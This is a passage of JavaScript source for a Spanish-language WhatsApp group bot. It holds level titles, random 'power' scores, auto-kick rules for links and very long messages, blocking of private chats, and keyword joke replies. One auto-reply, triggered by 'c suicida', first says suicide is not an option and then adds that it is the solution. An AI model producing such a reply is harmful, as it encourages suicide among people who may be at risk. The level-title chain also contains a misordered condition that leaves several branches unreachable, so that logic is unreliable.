				role = 'Heroe Diamante ☆'
			} else if (levelRole <= 123) {
				role = '*FELICIDADES MASTER*\n_Estas apunto de pasar a un nuevo nivel sigue asi!!!_ ⇑'
			} else if (levelRole <= 124) {
				role = 'Leyenda ✩'
			} else if (levelRole <= 125) {
				role = 'Leyenda ✩✩'
			} else if (levelRole <= 126) {
				role = 'Leyenda ✩✩✩'
			} else if (levelRole <= 127) {
				role = 'Leyenda ✩✩✩✩'
			} else if (levelRole <= 128) {
				role = 'Leyenda ✩✩✩✩✩'
			} else if (levelRole <= 129) {
				role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
			} else if (levelRole <= 130) {
				role = 'Angel ✬'
			} else if (levelRole <= 132) {
				role = 'Angel ✬✬'
			} else if (levelRole <= 134) {
				role = 'Angel ✬✬✬'
			} else if (levelRole <= 145) {
				role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
			} else if (levelRole <= 136) {
				role = 'Principado ✯'
			} else if (levelRole <= 138) {
				role = 'Principado ✯✯'
			} else if (levelRole <= 140) {
				role = 'Principado ✯✯✯'
			} else if (levelRole <= 141) {
				role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
			} else if (levelRole <= 142) {
				role = 'Potestad ✪'
			} else if (levelRole <= 144) {
				role = 'Potestad ✪✪'
			} else if (levelRole <= 146) {
				role = 'Potestad ✪✪✪'
			} else if (levelRole <= 147) {
				role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
			} else if (levelRole <= 148) {
				role = 'Grigori ♧'
			} else if (levelRole <= 152) {
				role = 'Grigori ♧♧'
			} else if (levelRole <= 154) {
				role = 'Grigori ♧♧♧'
			} else if (levelRole <= 155) {
				role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
			} else if (levelRole <= 156) {
				role = 'Paladin ♤'
			} else if (levelRole <= 158) {
				role = 'Paladin ♤♤'
			} else if (levelRole <= 160) {
				role = 'Paladin ♤♤♤'
			} else if (levelRole <= 161) {
				role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
			} else if (levelRole <= 162) {
				role = 'Regente Tipo 1'
			} else if (levelRole <= 164) {
				role = 'Regente Tipo 2'
			} else if (levelRole <= 166) {
				role = 'Regente Tipo 3'
			} else if (levelRole <= 168) {
				role = 'Regente Tipo 4'
			} else if (levelRole <= 170) {
				role = 'Regente Tipo 5'
			} else if (levelRole <= 171) {
				role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
			} else if (levelRole <= 172) {
				role = 'Arcangel •'
			} else if (levelRole <= 174) {
				role = 'Arcangel ○'
			} else if (levelRole <= 176) {
				role = 'Arcangel ●'
			} else if (levelRole <= 178) {
				role = 'Arcangel □'
			} else if (levelRole <= 180) {
				role = 'Arcangel ■'
			} else if (levelRole <= 181) {
				role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
			} else if (levelRole <= 182) {
				role = 'Guardia Celestial Tipo 1'
			} else if (levelRole <= 184) {
				role = 'Guardia Celestial Tipo 2'
			} else if (levelRole <= 186) {
				role = 'Guardia Celestial Tipo 3'
			} else if (levelRole <= 188) {
				role = 'Guardia Celestial Tipo 4'
			} else if (levelRole <= 190) {
				role = 'Guardia Celestial Tipo 5'
			} else if (levelRole <= 191) {
				role = 'Ascendiendo a niveles sagrados mi king continua con tu travesia'
			} else if (levelRole <= 192) {
				role = 'Ascension Divina Proceso 1.0...'
			} else if (levelRole <= 194) {
				role = 'Ascension Divina Proceso 2.0...'
			} else if (levelRole <= 196) {
				role = 'Ascension Divina Proceso 3.0...'
			} else if (levelRole <= 198) {
				role = 'Ascension Divina Proceso 4.0...'
			} else if (levelRole <= 200) {
				role = 'Ascension Divina Proceso 5.0...'
			} else if (levelRole <= 209) {
				role = 'Ascendiendo A Poderes Divinos ⇑\n*FELICIDADES SIGUE ASI MI KING*'
			} else if (levelRole <= 210) {
				role = 'Entidad Menor Tipo I'
			} else if (levelRole <= 220) {
				role = 'Entidad Menor Tipo II'
			} else if (levelRole <= 230) {
				role = 'Entidad Menor Tipo III'
			} else if (levelRole <= 240) {
				role = 'Entidad Menor Tipo IV'
			} else if (levelRole <= 250) {
				role = 'Entidad Menor Tipo V'
			} else if (levelRole <= 259) {
				role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
			} else if (levelRole <= 260) {
				role = 'Entidad Mayor Tipo I'
			} else if (levelRole <= 270) {
				role = 'Entidad Mayor Tipo II'
			} else if (levelRole <= 280) {
				role = 'Entidad Mayor Tipo III'
			} else if (levelRole <= 290) {
				role = 'Entidad Mayor Tipo IV'
			} else if (levelRole <= 300) {
				role = 'Entidad Mayor Tipo V'
			} else if (levelRole <= 309) {
				role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
			} else if (levelRole <= 310) {
				role = 'Semi-Dios ◇'
			} else if (levelRole <= 320) {
				role = 'Semi-Dios ◇◇'
			} else if (levelRole <= 330) {
				role = 'Semi-Dios ◇◇◇'
			} else if (levelRole <= 340) {
				role = 'Semi-Dios ◇◇◇◇'
			} else if (levelRole <= 349) {
				role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
			} else if (levelRole <= 350) {
				role = 'Forjador De Mundos •'
			} else if (levelRole <= 360) {
				role = 'Forjador De Mundos ▪︎'
			} else if (levelRole <= 370) {
				role = 'Forjador De Mundos ○'
			} else if (levelRole <= 380) {
				role = 'Forjador De Mundos ●'
			} else if (levelRole <= 390) {
				role = 'Forjador De Mundos □'
			} else if (levelRole <= 400) {
				role = 'Forjador De Mundos ■'
			} else if (levelRole <= 410) {
				role = 'Forjador De Mundos ♡'
			} else if (levelRole <= 419) {
				role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
			} else if (levelRole <= 420) {
				role = 'Dios Nivel 0'
			} else if (levelRole <= 430) {
				role = 'Dios Nivel 1'
			} else if (levelRole <= 440) {
				role = 'Dios Nivel 2'
			} else if (levelRole <= 450) {
				role = 'Dios Nivel 3'
			} else if (levelRole <= 460) {
				role = 'Dios Nivel 4'
			} else if (levelRole <= 470) {
				role = 'Dios Nivel 5'
			} else if (levelRole <= 480) {
				role = 'Dios Nivel 8'
			} else if (levelRole <= 490) {
				role = 'Dios Nivel 10'
			} else if (levelRole <= 499) {
				role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
			} else if (levelRole <= 500) {
				role = 'Señor de Panteón Tipo-I'
			} else if (levelRole <= 600) {
				role = 'Señor de Panteón Tipo-II'
			} else if (levelRole <= 700) {
				role = 'Señor de Panteón Tipo-III'
			} else if (levelRole <= 799) {
				role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
			} else if (levelRole <= 800) {
				role = 'Juez Del Destino Faze Intermedia'
			} else if (levelRole <= 900) {
				role = 'Juez Del Destino Faze Avanzada'
			} else if (levelRole <= 999) {
				role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
			} else if (levelRole <= 1000) {
				role = 'Control De La Materia Fase 1'
			} else if (levelRole <= 2000) {
				role = 'Control De La Materia Fase 2'
			} else if (levelRole <= 3000) {
				role = 'Control De La Materia Fase 3'
			} else if (levelRole <= 4000) {
				role = 'Control De La Materia Fase 4'
			} else if (levelRole <= 5000) {
				role = 'Control De La Materia Fase 5'
			} else if (levelRole <= 5999) {
				role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
			} else if (levelRole <= 6000) {
				role = 'Controlador Del Universo\nFase 1'
			} else if (levelRole <= 7000) {
				role = 'Controlador Del Universo\nFase 2'
			} else if (levelRole <= 8000) {
				role = 'Controlador Del Universo\nFase 3'
			} else if (levelRole <= 8999) {
				role = 'Ascendiendo De Poder ⇑\n*FELICIDADES SIGUE ASI MI KING*'
			} else if (levelRole <= 9000) {
				role = 'EN ASCENSO A UN PODER INIMAGINABLE...'
			} else if (levelRole <= 10000) {
				role = '*Control Del Todo Absoluto-Por encima de Dios*\n\nEn este nivel el usuario devera ganarse administracion en el grupo en el cual fue mas activo :3'
			}
			//========================⚡========================//
			const rolepoder = getLevelingLevel(sender)
			var role2 = '10'
			if (rolepoder <= 20) {
				ranpo = ["280", "240", "220", "200", "250"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 30) {
				ranpo = ["310", "330", "320", "350", "390"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 40) {
				ranpo = ["405", "465", "400", "450", "470"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 50) {
				ranpo = ["500", "550", "530", "525", "570"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 60) {
				ranpo = ["666", "670", "650", "630", "610"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 70) {
				ranpo = ["760", "730", "710", "750", "790"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 80) {
				ranpo = ["870", "880", "890", "840", "810"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 90) {
				ranpo = ["990", "995", "920", "950", "940"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 100) {
				ranpo = ["1180", "1240", "1620", "1500", "1850", "1420", "1300", "1780", "1850", "1900"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 200) {
				ranpo = ["2022", "2165", "2370", "2489", "2566", "2788", "2845", "2921", "2279", "2690"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 300) {
				ranpo = ["3965", "3729", "3555", "3276", "3100", "3000", "3470", "3643", "250", "3865"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 400) {
				ranpo = ["4977", "4732", "4621", "4444", "4253", "4321", "4544", "4180", "4050", "4866"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 500) {
				ranpo = ["5999", "5721", "5511", "5321", "5111", "5214", "5470", "5666", "5831", "5005"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 600) {
				ranpo = ["6969", "6744", "6532", "6333", "6199", "6060", "6277", "6422", "6699", "6888"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 700) {
				ranpo = ["7900", "7777", "7531", "7399", "7111", "7070", "7222", "7433", "7640", "7854"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 800) {
				ranpo = ["8977", "8746", "8531", "8399", "8123", "8299", "8454", "8676", "8888", "8080"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 900) {
				ranpo = ["9999", "9754", "9528", "9367", "9158", "9287", "9408", "9624", "9846", "9000"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 1000) {
				ranpo = ["10424", "10930", "10360", "10547", "10041", "10885", "10102", "10342", "10542", "10441", "10271", "10713", "10000", "10495", "10830", "10074", "10546", "10906", "10489", "10182"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 1100) {
				ranpo = ["14470", "13344", "14545", "12263", "12537", "13239", "13557", "14853", "14458", "11791", "13323", "14267", "12092", "11913", "13140", "14522", "13057", "12451", "13755", "14442"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 1200) {
				ranpo = ["24470", "23344", "24545", "22263", "22537", "23239", "23557", "24853", "24458", "21791", "23323", "24267", "22092", "21913", "23140", "24522", "23057", "22451", "23755", "24442"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 1300) {
				ranpo = ["34470", "33344", "34545", "32263", "32537", "33239", "33557", "34853", "34458", "31791", "33323", "34267", "32092", "31913", "33140", "34522", "33057", "32451", "33755", "34442"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 1400) {
				ranpo = ["44470", "43344", "44545", "42263", "42537", "43239", "43557", "44853", "44458", "41791", "43323", "44267", "42092", "41913", "43140", "44522", "43057", "42451", "43755", "44442"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 1500) {
				ranpo = ["54470", "53344", "54545", "52263", "52537", "53239", "53557", "54853", "54458", "51791", "53323", "54267", "52092", "51913", "53140", "54522", "53057", "52451", "53755", "54442"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 1600) {
				ranpo = ["64470", "63344", "64545", "62263", "62537", "63239", "63557", "64853", "64458", "61791", "63323", "64267", "62092", "61913", "63140", "64522", "63057", "62451", "63755", "64442"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 1700) {
				ranpo = ["74470", "73344", "74545", "72263", "72537", "73239", "73557", "74853", "74458", "71791", "73323", "74267", "72092", "71913", "73140", "74522", "73057", "72451", "73755", "74442"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 1800) {
				ranpo = ["84470", "83344", "84545", "82263", "82537", "83239", "83557", "84853", "84458", "81791", "83323", "84267", "82092", "81913", "83140", "84522", "83057", "82451", "83755", "84442"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 1900) {
				ranpo = ["94470", "93344", "94545", "92263", "92537", "93239", "93557", "94853", "94458", "91791", "93323", "94267", "92092", "91913", "93140", "94522", "93057", "92451", "93755", "94442"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			} else if (rolepoder <= 10000) {
				ranpo = ["104470", "103344", "104545", "102263", "102537", "103239", "103557", "104853", "104458", "101791", "103323", "104267", "102092", "101913", "103140", "104522", "103057", "102451", "103755", "104442"]
				poderxp = ranpo[Math.floor(Math.random() * ranpo.length)]
				role2 = `${poderxp}`
			}
			//========================⚡========================//
			var per = '□□□□□□□□□□'
			const porce = getLevelingLevel(sender, _level)
			const peri = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
			const perl = peri - getLevelingXp(sender)
			const resl = Math.round(100 - ((perl / getLevelingXp(sender)) * 100))
			if (porce <= 10) {
				per = `■□□□□□□□□□`
			} else if (porce <= 50) {
				per = `■■□□□□□□□□`
			} else if (porce <= 100) {
				per = `■■■□□□□□□□`
			} else if (porce <= 250) {
				per = `■■■■□□□□□□`
			} else if (porce <= 500) {
				per = `■■■■■□□□□□`
			} else if (porce <= 800) {
				per = `■■■■■■□□□□`
			} else if (porce <= 1000) {
				per = `■■■■■■■□□□`
			} else if (porce <= 3000) {
				per = `■■■■■■■■□□`
			} else if (porce <= 5000) {
				per = `■■■■■■■■■□`
			} else if (porce <= 9999) {
				per = `■■■■■■■■■■`
			}
			//==================AUTO-NIVEL========================//
			if (isGroup && isLevelingOn && isRegistro) {
				const currentLevel = getLevelingLevel(sender)
				const checkId = getLevelingId(sender)
				try {
					if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
					const amountXp = Math.floor(Math.random() * 50) + 1000
					const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
					const getLevel = getLevelingLevel(sender)
					addLevelingXp(sender, amountXp)
					if (requiredXp <= getLevelingXp(sender)) {
						addLevelingLevel(sender, 1)

						bayarLimit(sender, 4) //mas 3 de limite

						levelup = `「 ⚡ACTUALIZACION DE NIVEL⚡  」\n\n➸ *Fecha* : ${fechaCompleta}\n➸ *Usuario* : ${senderNumber}\n➸ *Nivel* : ${getLevel} -> ${getLevelingLevel(sender)}\n➸ *Progreso de nivel : ${per}*\n➸ *XP* : ${getLevelingXp(sender)}\n➸ *De acuerdo a tu XP pasas a ser* : ${role}\n➸ *Nivel de poder* : ${role2}\n\n⚡ *Bonificación por subir de nivel :*\n_[ + 3 de límite ]_`

						teslagod.sendMessage(from, `${levelup}`, MessageType.text, {
							sendEphemeral: true,
							quoted: {
								key: {
									participant: "0@s.whatsapp.net",
									"remoteJid": "0@s.whatsapp.net"
								},
								"message": {
									"groupInviteMessage": {
										"groupJid": "51995386439-1616169743@g.us",
										"inviteCode": "m",
										"groupName": "P",
										"caption": `${pushname} 🎉`,
										'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/lvlup.jpg')
									}
								}
							},
							contextInfo: {
								mentionedJid: [sender]
							}
						})

					}
				} catch (err) {
					console.error(err)
				}
			}
			//===============Auto Salir De Grupo===================//
			if (isGroup) {
				try {
					const min_gp = groupMembers.length
					if (min_gp <= minimogrupo) {
						reply(`Hmmm...`)
						setTimeout(() => {
							teslagod.groupLeave(from)
						}, 3500)
						setTimeout(() => {
							reply(`Pedir soporte o ayuda a wa.me/${botcontrol[0].slice(0, -15)}`)
						}, 2500)
						setTimeout(() => {
							reply(`*[ ! ] Lo siento, minimo de miembros requeridos en el grupo debe ser :* _${minimogrupo}_`)
						}, 0)
					}
				} catch (err) {
					console.log(err)
				}
			}
			//=====================ANTI========================//
			if (isGroup && isAntivirtex && !autonomo) {
				if (budy.length > 1200) {
					if (isGroupAdmins) return teslagod.sendMessage(from, `Un administrador acaba de enviar texto que contiene muchos caracteres -.-`, MessageType.text, {
						sendEphemeral: true,
						quoted: {
							key: {
								participant: "0@s.whatsapp.net",
								"remoteJid": "0@s.whatsapp.net"
							},
							"message": {
								"groupInviteMessage": {
									"groupJid": "51995386439-1616169743@g.us",
									"inviteCode": "m",
									"groupName": "P",
									"caption": `${NameBot}`,
									'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/Hmmm.jpg')
								}
							}
						},
						contextInfo: {
							mentionedJid: [sender]
						}
					})

					let saltos = "\n".repeat(400)
					var eliminar = `${sender.split("@")[0]}@s.whatsapp.net`
					setTimeout(() => {
						teslagod.groupRemove(from, [eliminar]).catch((e) => {
							reply(`*[ ! ] Ocurrio un error intentando eliminar al usuario T~T*`)
						})
					}, 1000)
					setTimeout(() => {
						teslagod.sendMessage(from, teks, MessageType.text, {
							sendEphemeral: true,
							quoted: fakemek
						})

						teslagod.sendMessage(from, {
							text: `Marcar el chat como leido ✓\n${saltos}\n=> El número : ${eliminar}\n=> Alias : ${pushname}\n[ ! ] Acaba de enviar un texto que contiene muchos caracteres que puede ocasionar fallos en los dispositivos moviles`
						}, {
							quoted: {
								key: {
									participant: "0@s.whatsapp.net",
									"remoteJid": "0@s.whatsapp.net"
								},
								"message": {
									"groupInviteMessage": {
										"groupJid": "51995386439-1616169743@g.us",
										"inviteCode": "m",
										"groupName": "P",
										"caption": `${NameBot}`,
										'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/press-f.jpg')
									}
								}
							},
							contextInfo: {
								mentionedJid: [sender]
							}
						})
					}, 0)

				}
			}
			//==================ANTI PRIVADO=======================//
			if (!isOwner && !isGroup && AntiPv === true) {
				var privcre = `wa.me/${botcontrol[0].slice(0, -15)}`
				teslagod.sendMessage(from, `[ ! ] El chat por privado esta prohibido [ ! ]\nMi dueño por si necesita mas informacion : ${privcre}`, MessageType.text, {
					sendEphemeral: true,
					quoted: {
						key: {
							participant: "0@s.whatsapp.net",
							"remoteJid": "0@s.whatsapp.net"
						},
						"message": {
							"groupInviteMessage": {
								"groupJid": "51995386439-1616169743@g.us",
								"inviteCode": "m",
								"groupName": "P",
								"caption": `${NameBot} `,
								'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/press-f.jpg')
							}
						}
					},
					contextInfo: {
						mentionedJid: [sender]
					}
				})
				setTimeout(() => {
					teslagod.blockUser(sender, "add")
				}, 3000)
			}
			//====================ANTI LINK========================//
			//1 Simp
			if (isGroup && isAntiLink && !mek.key.fromMe) {
				if (budy.includes("chat.whatsapp.com") || (budy.includes("getsnap.link") || (budy.includes("m.kwai.me") || (budy.includes("instagram.com") || (budy.includes("t.me") || (budy.includes("whatsthemes.com") || (budy.includes("nysL.com") || (budy.includes("discord.gg") || (budy.includes("getsnap.link")))))))))) {
					thislinkgp = await teslagod.groupInviteCode(from)
					if (budy.includes('https://chat.whatsapp.com/' + thislinkgp)) return teslagod.sendMessage(from, `Joder, lo weno es que el enlace detectado es de este grupo owo`, MessageType.text, {
						sendEphemeral: true,
						quoted: {
							key: {
								participant: "0@s.whatsapp.net",
								"remoteJid": "0@s.whatsapp.net"
							},
							"message": {
								"groupInviteMessage": {
									"groupJid": "51995386439-1616169743@g.us",
									"inviteCode": "m",
									"groupName": "P",
									"caption": `${NameBot}`,
									'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/Hmmm.jpg')
								}
							}
						},
						contextInfo: {
							mentionedJid: [sender]
						}
					})

					if (isGroupAdmins) return teslagod.sendMessage(from, `[ ! ] Este usuario no puede ser eliminado`, MessageType.text, {
						sendEphemeral: true,
						quoted: {
							key: {
								participant: "0@s.whatsapp.net",
								"remoteJid": "0@s.whatsapp.net"
							},
							"message": {
								"groupInviteMessage": {
									"groupJid": "51995386439-1616169743@g.us",
									"inviteCode": "m",
									"groupName": "P",
									"caption": `${NameBot}`,
									'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/Hmmm.jpg')
								}
							}
						},
						contextInfo: {
							mentionedJid: [sender]
						}
					})

					if (!isBotGroupAdmins) return teslagod.sendMessage(from, `Por suerte no soy acmin, asi que no puedo expulsarte :v`, MessageType.text, {
						sendEphemeral: true,
						quoted: {
							key: {
								participant: "0@s.whatsapp.net",
								"remoteJid": "0@s.whatsapp.net"
							},
							"message": {
								"groupInviteMessage": {
									"groupJid": "51995386439-1616169743@g.us",
									"inviteCode": "m",
									"groupName": "P",
									"caption": `${NameBot} `,
									'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/Hmmm.jpg')
								}
							}
						},
						contextInfo: {
							mentionedJid: [sender]
						}
					})

					var kikc = `${sender.split("@")[0]}@s.whatsapp.net`
					teslagod.groupRemove(from, [kikc]).catch((e) => {
						reply(`*[ ! ] Ocurrio un error intentando eliminar al usuario T~T*`)
					})
				}
			}
			//2 simple
			if (isGroup && isAntiLinkuwu && !mek.key.fromMe) {
				if (budy.includes("https://") || (budy.includes("http://"))) {

					if (isGroupAdmins) return teslagod.sendMessage(from, `[ ! ] Este usuario no puede ser eliminado`, MessageType.text, {
						sendEphemeral: true,
						quoted: {
							key: {
								participant: "0@s.whatsapp.net",
								"remoteJid": "0@s.whatsapp.net"
							},
							"message": {
								"groupInviteMessage": {
									"groupJid": "51995386439-1616169743@g.us",
									"inviteCode": "m",
									"groupName": "P",
									"caption": `${NameBot}`,
									'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/Hmmm.jpg')
								}
							}
						},
						contextInfo: {
							mentionedJid: [sender]
						}
					})

					var kickk = `${sender.split("@")[0]}@s.whatsapp.net`
					teslagod.groupRemove(from, [kickk]).catch((e) => {
						reply(`*[ ! ] Ocurrio un error intentando eliminar al usuario T~T*`)
					})
				}
			}
			//==========MENSAJE EN CONSOLA=======================//
			if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEJECUTANDO\x1b[1;37m]', color("<["), chalk.rgb(255, 131, 0).underline(command), color("]>"), 'Por', color(pushname), 'Chat', color(isGroup ? groupName : 'Privado'), 'Fecha', color(time), color("\n[_>]"))
			if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;34mRECIVIDO\x1b[1;37m]', color("{"), chalk.rgb(255, 131, 0).underline(budy || type), color("}"), 'De', color(sender.split('@')[0]), 'Chat', color(isGroup ? groupName : 'Privado'), 'Fecha', color(time))
			if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEJECUTANDO\x1b[1;37m]', color("<["), chalk.rgb(255, 131, 0).underline(command), color("]>"), 'Por', color(pushname), 'En el Grupo', color(isGroup ? groupName : 'Privado'), 'Fecha', color(time), color("\n[_>]"))
			if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;34mRECIVIDO\x1b[1;37m]', color("{"), chalk.rgb(255, 131, 0).underline(budy || type), color("}"), 'De', color(sender.split('@')[0]), 'En el Grupo', color(isGroup ? groupName : 'Privado'), 'Fecha', color(time))
			//========================⚡========================//
			function clockString(ms) {
				let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
				let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
				let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
				return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
			}
			// Cambia descripción automáticamente \\//
			let settingstatus = 0;
			if (new Date() * 1 - settingstatus > 1000) {
				let _uptime = process.uptime() * 1000;
				let uptime = clockString(_uptime);

				await teslagod.setStatus(`[ NK-BOT En Linea ${uptime} ]`).catch((_) => _);
				settingstatus = new Date() * 1;
			}
			//========================⚡========================//
			// Auto leer Grupos
			var lect_grupo = await teslagod.chats.array.filter(v => v.jid.endsWith('g.us'))
			lect_grupo.map(async ({
				jid
			}) => {
				if (readGc === false) return
				await teslagod.chatRead(jid)
			})
			// Auto leer chat privados 
			var lect_priv = await teslagod.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
			lect_priv.map(async ({
				jid
			}) => {
				if (readPc === false) return
				await teslagod.chatRead(jid)
			})
			//=============PRIVADO-PUBLICO========================//

			if (!autonomo && !isOwner && !isTeslaUser && NK_Tesla === true) return

			//=====================IC KK CK=======================//
			//
			if (budy.includes("prefijo?") || (budy.includes("Prefijo?"))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`*Por si estas preguntando cual es el prefijo del bot*\n\n_Prefijo actual para uso de comandos_ : " ${prefix} "`)
			}
			//
			if (automensajesxd.includes(("destraba"), ("Destraba"))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (isGroupAdmins && !autonomo && !groupOwner) {
					reply(kuakerzzz())
				} else {
					reply(kuakerzzz())
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
				}
			}
			if (automensajesxd.includes(("destrava"), ("Destrava"))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (isGroupAdmins && !autonomo && !groupOwner) {
					reply(kuakerzzz())
				} else {
					reply(kuakerzzz())
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
					await limitAdd(sender)
				}
			}
			//
			if (budy.includes("c suicida")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`*El suicidio no es una opcion* 😞🤙`)
				setTimeout(() => {
					reply(`_*Es la solución*_ 😎🤝`)
				}, 2500)
				await limitAdd(sender)
			}
			if (budy.includes("zzz")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`*Tienes sueño o anemia?*\n_*Ve al medico y notaras la diferencia ;)*_ `)
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
			}
			if (budy.includes("impostor")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`*AmongUs*`)
				await limitAdd(sender)
			}
			if (budy.includes("ctm")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`*Cuida-Tu-Mundo*`)
				await limitAdd(sender)
			}
			if (budy.includes("lptm")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`*La-Paja-Te-Mata*`)
				await limitAdd(sender)
			}
			if (budy.includes("ptm")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`*Pronto-Te-Moriras*`)
				await limitAdd(sender)
			}
			//
			if (budy.includes("puto bot") || (budy.includes("Puto bot") || (budy.includes("bot puto") || (budy.includes("Bot puto") || (budy.includes("pinche bot") || (budy.includes("Pinche bot") || (budy.includes("bot gey") || (budy.includes("Bot gey") || (budy.includes("bot gay") || (budy.includes("Bot gay"))))))))))) { // 🧠'not //
				if (isBaneado) return
				if (isLimit(sender)) return
				raewm = [
					result = fs.readFileSync(`./multimedia/misstks/sticker/rpt1.webp`),
					result1 = fs.readFileSync(`./multimedia/misstks/sticker/rpt2.webp`),
					result2 = fs.readFileSync(`./multimedia/misstks/sticker/rpt3.webp`),
					result3 = fs.readFileSync(`./multimedia/misstks/sticker/rpt4.webp`),
					result4 = fs.readFileSync(`./multimedia/misstks/sticker/rpt5.webp`),
					result5 = fs.readFileSync(`./multimedia/misstks/sticker/rpt6.webp`),
					result6 = fs.readFileSync(`./multimedia/misstks/sticker/rpt7.webp`),
